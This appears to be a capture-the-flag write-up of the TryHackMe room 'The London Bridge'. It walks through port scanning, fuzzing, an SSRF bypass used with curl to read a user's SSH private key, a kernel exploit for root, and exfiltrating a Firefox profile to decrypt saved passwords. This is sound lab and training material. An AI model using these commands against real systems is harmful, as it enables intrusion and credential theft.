---
title: THM The London Bridge
author: hanhctf
date: 2024-10-02 12:00:00 +0700
categories: [Write-up, THM]
tags: [SSRF]
toc: true
mermaid: true
---

# [**The London Bridge**](https://tryhackme.com/r/room/thelondonbridge)

# Summary

> - Enumeration Hiden Parameter.
> - SSRF --> local port --> gaince access.
> - Old kernel vulnerability.
> - Firefox_decryptor profile.

## NMAP

```text
PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDziNs6aSHIQOJFilv8PhCPd676iD1TrhMYe4p4Mj2E3yaAl4xb8DNT2dhpcv6H8EvtCJnAbXmnFTTOZy14fd7FKc2/Mr4MNLsINFpMU8hc85g6S9ZEnWKlU8dw5jUUeZnAbHSTnq6ARvEbT/Y5seiWEJ7IBiUqptlUA2eiOU7g0DFwrYH7n40aDe0m6PKPIfI9G0XO0cJHISeJ0bsSES1uun2WHLM0sRx+17hrBgM2YfD9OevcltVMlQqWasP9lqf2ooOdBvQTq4eH5UyyuEzaRtQwBYP/wWQEVFacejJE1iT2VD6ZAilhlzo9mww9vqTEwGTvatH65wiyCZHMvrSb
|   256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuZrGZxDIlI4pU1KNZ8A87cWFcgHxRSt7yFgBtJoUQMhNmcw8FSVC54b7sBYXCgBsgISZfWYPjBM9kikh8Jnkw=
|   256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkCeqFADY/YvhJyJabcs5DVTYbl/DEKEpBoluTuDdB1
8080/tcp open  http-proxy syn-ack gunicorn
|_http-server-header: gunicorn
|_http-title: Explore London
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Wed, 02 Oct 2024 11:10:49 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2682
|     <!DOCTYPE html>
```

## Enumeration

Two open port are `22 for ssh` and `8080 for http server`.  
When there is a `http/https server`, I usualy do 2 things in a same time.
Run FUZZ `ffuf` to check directory available.

```shell
┌──(kali㉿kali)-[~/thm/LondonBridge]
└─$ ffuf -w /opt/SecLists/Discovery/Web-Content/big.txt -u http://10.10.164.171:8080/FUZZ      

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.164.171:8080/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

contact                 [Status: 200, Size: 1703, Words: 549, Lines: 60, Duration: 334ms]
feedback                [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 332ms]
gallery                 [Status: 200, Size: 1722, Words: 484, Lines: 55, Duration: 331ms]
upload                  [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 333ms]
view_image              [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 379ms]
:: Progress: [20476/20476] :: Job [1/1] :: 119 req/sec :: Duration: [0:02:52] :: Errors: 0 ::
```

And access the website to check.
The website run on `Gunicorn` server.
![](/commons/THM/LondonBridge/0_website.png)

Check all function on the website, we can upload `image` via `/gallery`.  
After spending a lot of time testing the `File upload`, can not find the way to bypass it.

Look back to result of FUZZ, `view_image`.  
Testin on `view_image`.

![](/commons/THM/LondonBridge/1_view_image.png)

GET Method is not allow. I switch to `curl` to check POST Method.

![](/commons/THM/LondonBridge/2_post.png)

POST method is supported. We try FUZZ the parameter used by the page.

Fuzzing got a parameter `www`. Look like there is SSRF vuln.  
Testing SSRF with an image in the website `http://10.10.164.171:8080/uploads/www.usnews.jpeg`

![](/commons/THM/LondonBridge/4_ssrf.png)


Curl signal that it is about to display a binary file. This tells us that the image was fetched. We can now try to check if this server can display images/files from external links. To check this we will create a fake file and host it on a simple PHP server.

```shell
echo "SSRF" > test.txt
python3 -m http.server 80
```

![](/commons/THM/LondonBridge/5_ssrf.png)

Greate. The `test.txt` was imported by the server and displayed to us.  

Try access port `8080` on local.

![](/commons/THM/LondonBridge/6_forbidden.png)

`Forbidden`. We can use [this](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass) to bypass it.

![](/commons/THM/LondonBridge/7_bypass.png)

Scan all port on local of target.
Create a list `port.txt`

![](/commons/THM/LondonBridge/8_port.png)

![](/commons/THM/LondonBridge/9_port.png)

We can access port `80`.  
FUZZ parameter on port `80`.

![](/commons/THM/LondonBridge/9_ssh.png)

Got `.ssh`, try get `id_rsa`, `authorized_keys`.  
```shell
──(kali㉿kali)-[~/thm/LondonBridge]
└─$ curl http://10.10.164.171:8080/view_image -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'www=http://127.1:80/.ssh/authorized_keys'
ssh-rsa <REDACTED>@london
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/thm/LondonBridge]
└─$ curl http://10.10.164.171:8080/view_image -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'www=http://127.1:80/.ssh/id_rsa'         
-----BEGIN RSA PRIVATE KEY-----
<REDACTED>
-----END RSA PRIVATE KEY-----
                                                                                        
```

From that, we can `ssh` to machine.  
***GOT USER FLAG***

## PRIVILEGE ESCALATION

Upload `linpeas.sh` to `/tmp`.  

The target is using kernel 4.15.0-112, very old and vuln.

![](/commons/THM/LondonBridge/10_kernel.png)

Google exploit.

![](/commons/THM/LondonBridge/11_exploit.png)

This vulnerability can be exploited in different ways depending on what is present on the target. So let’s download the Github repository containing the different POCs for this vulnerability.

![](/commons/THM/LondonBridge/12_root.png)

***GOT ROOT FLAG***

## Charles flag


On `/home/charles` there is `mozila` profile.
Got it and analyz.

Archive file and send it to our attack host to extract the passwords.

```shell
root@london:/home/charles# ls -la
total 24
drw------- 3 charles charles 4096 Apr 23 22:11 .
drwxr-xr-x 4 root    root    4096 Mar 10  2024 ..
lrwxrwxrwx 1 root    root       9 Apr 23 22:11 .bash_history -> /dev/null
-rw------- 1 charles charles  220 Mar 10  2024 .bash_logout
-rw------- 1 charles charles 3771 Mar 10  2024 .bashrc
drw------- 3 charles charles 4096 Mar 16  2024 .mozilla
-rw------- 1 charles charles  807 Mar 10  2024 .profile

root@london:/home/charles/.mozilla# tar -czf /tmp/firefox.tar filefox/
```

After archived the file, use `scp` to copy from target to local.

```shell
┌──(kali㉿kali)-[~/thm/LondonBridge]
└─$ scp -i id_rsa beth@10.10.164.171:/tmp/firefox.tar ./firefox.tar
firefox.tar 
```

De-archive it and use the Python [firefox_decryptor](https://github.com/unode/firefox_decrypt) to extract credentials stored in the browser’s database.

```shell
┌──(kali㉿kali)-[~/thm/LondonBridge]
└─$ tar -xaf firefox.tar 

┌──(kali㉿kali)-[~/thm/LondonBridge]
└─$ sudo chmod -R 777 ./firefox 

┌──(kali㉿kali)-[~/thm/LondonBridge]
└─$ git clone https://github.com/unode/firefox_decrypt.git
Cloning into 'firefox_decrypt'...
remote: Enumerating objects: 1374, done.
remote: Counting objects: 100% (485/485), done.
remote: Compressing objects: 100% (127/127), done.
remote: Total 1374 (delta 382), reused 439 (delta 353), pack-reused 889 (from 1)
Receiving objects: 100% (1374/1374), 495.80 KiB | 2.37 MiB/s, done.
Resolving deltas: 100% (864/864), done.

┌──(kali㉿kali)-[~/thm/LondonBridge]
└─$ cd firefox_decrypt

┌──(kali㉿kali)-[~/thm/LondonBridge/firefox_decrypt]
└─$ python3 firefox_decrypt.py ../firefox/8k3bf3zp.charles
```
